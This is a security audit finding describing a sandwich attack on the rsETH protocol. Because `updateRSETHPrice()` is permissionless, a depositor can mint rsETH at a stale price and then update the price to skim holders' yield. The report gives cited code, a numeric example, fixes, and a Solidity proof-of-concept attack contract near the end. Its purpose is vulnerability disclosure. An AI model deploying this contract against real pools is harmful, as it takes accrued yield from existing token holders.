### Title
Permissionless `updateRSETHPrice()` Enables Sandwich Attack to Steal Accrued Yield from rsETH Holders — (`contracts/LRTOracle.sol`)

---

### Summary

`LRTOracle.updateRSETHPrice()` carries no access control and is callable by any address. Because `LRTDepositPool` prices new deposits using the stored (potentially stale) `rsETHPrice`, an attacker can atomically (1) deposit at the stale lower price to receive excess rsETH, then (2) call `updateRSETHPrice()` to crystallise the true higher price. The attacker captures a portion of the yield that should have accrued exclusively to existing rsETH holders.

---

### Finding Description

`LRTOracle.updateRSETHPrice()` is declared `public` with only a `whenNotPaused` guard:

```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The stored `rsETHPrice` is only updated when this function is called. Between calls, protocol rewards accrue (EigenLayer restaking rewards, LST rebases, ETH staking rewards), causing the true per-rsETH ETH value to exceed the stored `rsETHPrice`.

`LRTDepositPool.getRsETHAmountToMint()` prices every deposit against the stale stored value:

```solidity
// contracts/LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

Because `rsETHPrice` is stale (lower than the true price), the depositor receives **more rsETH than the true exchange rate warrants**.

`_updateRsETHPrice()` then computes the new price as:

```solidity
// contracts/LRTOracle.sol L250
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

`rsethSupply` now includes the attacker's freshly minted rsETH, and `totalETHInProtocol` includes the attacker's deposited ETH. The new price is therefore lower than it would have been without the attacker's deposit, diluting the yield that should have gone to pre-existing holders.

**Attack steps (executable atomically in one transaction via a contract):**

1. Observe that `_getTotalEthInProtocol() > rsethSupply * rsETHPrice` (rewards have accrued).
2. Call `LRTDepositPool.depositETH{value: A}(0, "")` — receive `A / rsETHPrice` rsETH at the stale price.
3. Call `LRTOracle.updateRSETHPrice()` — price updates to `(TVL_true + A) / (S + A/rsETHPrice)`.
4. Attacker's rsETH is now worth more than `A` ETH; existing holders receive proportionally less yield.

The `pricePercentageLimit` guard only blocks price increases **above** the configured threshold; normal periodic reward accruals (typically well under 1 % per day) pass through without restriction, so the public path succeeds for every routine update window.

---

### Impact Explanation

**High — Theft of unclaimed yield.**

Existing rsETH holders are entitled to the full reward increment `(TVL_true − previousTVL)` minus the protocol fee. The attacker intercepts a fraction of that increment proportional to their deposit size relative to the post-deposit supply. For a 10 ETH reward window and a 10,000 ETH attacker deposit against a 1,000 ETH pre-existing TVL:

| | Before attack | After attack |
|---|---|---|
| rsETH supply | 1,000 | 11,000 |
| TVL | 1,010 ETH | 11,010 ETH |
| New price | 1.010 ETH/rsETH | 1.000909 ETH/rsETH |
| Existing holders' value | 1,010 ETH | 1,000.909 ETH |
| Attacker profit | — | ≈ 9.09 ETH |

The attacker extracts ≈ 9.09 ETH of yield that belonged to existing holders, with zero principal risk (the deposit is fully recoverable at the new price).

---

### Likelihood Explanation

**Medium.** Reward accrual is a continuous, predictable process. Any on-chain actor can read `_getTotalEthInProtocol()` and `rsETHPrice` to determine the current stale gap. No privileged access, leaked keys, or governance capture is required. The attack is executable by any EOA or contract, and can be batched atomically, eliminating execution risk. The only practical constraint is gas cost and the size of the reward window, both of which are easily modelled off-chain.

---

### Recommendation

1. **Restrict `updateRSETHPrice()`** to authorised callers (e.g., `onlyLRTManager` or a keeper role), mirroring the already-existing `updateRSETHPriceAsManager()`. The public entry point serves no security purpose that the manager path does not already cover.
2. **Alternatively**, record a `lastUpdateTimestamp` and reject deposits made in the same block as (or within a short window after) a price update, or vice-versa, to break atomicity.
3. **Alternatively**, use a time-weighted or commit-delay mechanism so that the price used for minting lags behind the price used for accounting, eliminating the sandwich window.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositETH(uint256 minRSETH, string calldata ref) external payable;
}

interface IOracle {
    function updateRSETHPrice() external;
}

contract SandwichYield {
    IDepositPool immutable pool;
    IOracle      immutable oracle;

    constructor(address _pool, address _oracle) {
        pool   = IDepositPool(_pool);
        oracle = IOracle(_oracle);
    }

    /// @notice Single-tx sandwich: deposit at stale price, then update price.
    function attack() external payable {
        // Step 1: deposit at stale (lower) rsETHPrice → receive excess rsETH
        pool.depositETH{value: msg.value}(0, "");

        // Step 2: update price → attacker's rsETH is now worth more than msg.value
        oracle.updateRSETHPrice();

        // Attacker holds rsETH worth > msg.value; existing holders' yield is diluted.
    }
}
```

**Concrete scenario:**
- Protocol state: `rsETHPrice = 1.000 ETH/rsETH` (stale), true TVL implies `1.010 ETH/rsETH`.
- Attacker calls `attack{value: 10_000 ether}()`.
- Receives `10_000 / 1.000 = 10_000 rsETH` (instead of `10_000 / 1.010 ≈ 9,901 rsETH` at the true price).
- After `updateRSETHPrice()`, new price ≈ `1.000909 ETH/rsETH`.
- Attacker's 10,000 rsETH ≈ 10,009.09 ETH — a risk-free gain of ≈ 9.09 ETH stolen from existing holders.

**Relevant lines:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L214-251)
```text
    function _updateRsETHPrice() internal {
        address rsETHTokenAddress = lrtConfig.rsETH();
        uint256 rsethSupply = IRSETH(rsETHTokenAddress).totalSupply();

        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
        }

        if (highestRsethPrice == 0) {
            highestRsethPrice = rsETHPrice;
        }

        uint256 previousPrice = rsETHPrice;

        // get total ETH in the protocol (normalized to 1e18)
        uint256 totalETHInProtocol = _getTotalEthInProtocol();

        // calculate previousTVL using rsethSupply multiplied by rsETHPrice
        uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);

        IPausable lrtDepositPool = IPausable(lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL));
        IPausable withdrawalManager = IPausable(lrtConfig.getContract(LRTConstants.LRT_WITHDRAW_MANAGER));

        // determine if the protocol is active (not paused)
        bool protocolPaused = lrtDepositPool.paused() || withdrawalManager.paused() || paused;

        // only take fee if TVL increased and protocol is not paused
        uint256 protocolFeeInETH = 0;
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);

```

**File:** contracts/LRTDepositPool.sol (L76-93)
```text
    function depositETH(
        uint256 minRSETHAmountExpected,
        string calldata referralId
    )
        external
        payable
        nonReentrant
        whenNotPaused
        onlySupportedAsset(LRTConstants.ETH_TOKEN)
    {
        // checks
        uint256 rsethAmountToMint = _beforeDeposit(LRTConstants.ETH_TOKEN, msg.value, minRSETHAmountExpected);

        // interactions
        _mintRsETH(rsethAmountToMint);

        emit ETHDeposit(msg.sender, msg.value, rsethAmountToMint, referralId);
    }
```

**File:** contracts/LRTDepositPool.sol (L506-521)
```text
    function getRsETHAmountToMint(
        address asset,
        uint256 amount
    )
        public
        view
        override
        returns (uint256 rsethAmountToMint)
    {
        // setup oracle contract
        address lrtOracleAddress = lrtConfig.getContract(LRTConstants.LRT_ORACLE);
        ILRTOracle lrtOracle = ILRTOracle(lrtOracleAddress);

        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```
